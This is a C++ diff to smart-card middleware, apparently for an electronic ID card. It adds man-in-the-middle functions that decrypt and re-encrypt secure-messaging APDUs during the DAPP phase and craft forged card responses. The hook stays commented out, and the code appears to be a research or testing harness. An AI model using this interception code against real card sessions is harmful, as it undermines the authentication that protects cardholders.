@@ -87,6 +87,14 @@ uint8_t diffMAC[] = { 0x00, 0x00, 0x00, 0x02 };
 ByteDynArray sessENC_IFD, sessMAC_IFD, sessSSC_IFD;
 ByteDynArray sessENC_ICC, sessMAC_ICC, sessSSC_ICC;
 
+//DAPP
+uint8_t SelectKey[] = { 0x0c, 0x22, 0x81, 0xb6 };
+uint8_t VerifyCert1[] = { 0x1c, 0x2A, 0x00, 0xAE };
+uint8_t VerifyCert2[] = { 0x0c, 0x2A, 0x00, 0xAE };
+uint8_t SetCHR[] = { 0x0c, 0x22, 0x81, 0xA4 };
+uint8_t GetChallenge[] = { 0x0c, 0x84, 0x00, 0x00 };
+BYTE certenc[354] = {};
+
 void increment(ByteArray &seq) {
 	for (size_t i = seq.size() - 1; i >= 0; i--) {
 		if (seq[i] < 255) {
@@ -226,7 +234,7 @@ ByteDynArray SM(ByteArray &keyEnc, ByteArray &keySig, ByteArray &apdu, ByteArray
 	return elabResp;
 }
 
-void mitm_out(BYTE *apdu, DWORD apduSize) {
+void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQUEST *pioSendPci) {
 	prev_apduSize = curr_apduSize;
 	prev_apdu = (BYTE *) realloc(prev_apdu, sizeof(BYTE) * prev_apduSize);
 	memcpy(prev_apdu, curr_apdu, prev_apduSize);
@@ -271,7 +279,7 @@ void mitm_out(BYTE *apdu, DWORD apduSize) {
 		
 		break;
 	case DAPP:
-		{
+		if (memcmp(apdu, SelectKey, 4) == 0) {
 			ByteDynArray iv(8);
 			iv.fill(0);
 			CDES3 encDes(sessENC_IFD, iv);
@@ -294,7 +302,83 @@ void mitm_out(BYTE *apdu, DWORD apduSize) {
 
 			LOG_DEBUG("apdu modified:");
 			LOG_BUFFER(smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, VerifyCert1, 4) == 0) {
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[232];
+			memcpy(supp,apdu+9,232);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray data = encDes.RawDecode(encData);
+			data.resize(RemoveISOPad(data),true);
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x10, 0x2A, 0x00, 0xAE };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, VerifyCert2, 4) == 0) {
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[128];
+			memcpy(supp,apdu+9,128);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray data = encDes.RawDecode(encData);
+			data.resize(RemoveISOPad(data),true);
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x2A, 0x00, 0xAE };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, SetCHR, 4) == 0) {
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[16];
+			memcpy(supp,apdu+8,16);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray data = encDes.RawDecode(encData);
+			data.resize(RemoveISOPad(data),true);
+			LOG_DEBUG("data dec:");
+			LOG_BUFFER(data.data(), data.size());
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x22, 0x81, 0xA4 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, GetChallenge, 4) == 0) {
+			ByteDynArray smApdu;
+			uint8_t chLen = 8;
+			BYTE head[] = { 0x00, 0x84, 0x00, 0x00 };
+			ByteArray headBa = VarToByteArray(head);
+			ByteDynArray data = ByteDynArray();
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, chLen);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
 		}
+		
 		break;
 	default:
 		break;
@@ -407,16 +491,13 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 		}
 		break;
 	case DAPP:
-			{
-				LOG_DEBUG("resp:");
-				LOG_BUFFER(resp, 16);
+			{   
+				LOG_BUFFER(resp, respSize);
 				BYTE temp[16] = {};
 				memcpy(temp, resp, 16); 
 				ByteDynArray respBa = VarToByteArray(temp);
 				ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
 				memcpy(resp, crafted_resp.data(), 16);
-				LOG_DEBUG("crafted_resp:");
-				LOG_BUFFER(crafted_resp.data(), crafted_resp.size());
 			}
 		break;
 	default:
@@ -472,7 +553,7 @@ int TokenTransmitCallback(CSlot *data, BYTE *apdu, DWORD apduSize, BYTE *resp, D
                   
 	//ODS(String().printf("APDU: %s\n", dumpHexData(ByteArray(apdu, apduSize), String()).lock()).lock());
 	// START MITM
-    //mitm_out(apdu, apduSize);
+    //mitm_out(apdu, apduSize, data->hCard, SCARD_PCI_T1);
 	auto ris = SCardTransmit(data->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
     //mitm_in(resp, *respSize);
 	// END MITM
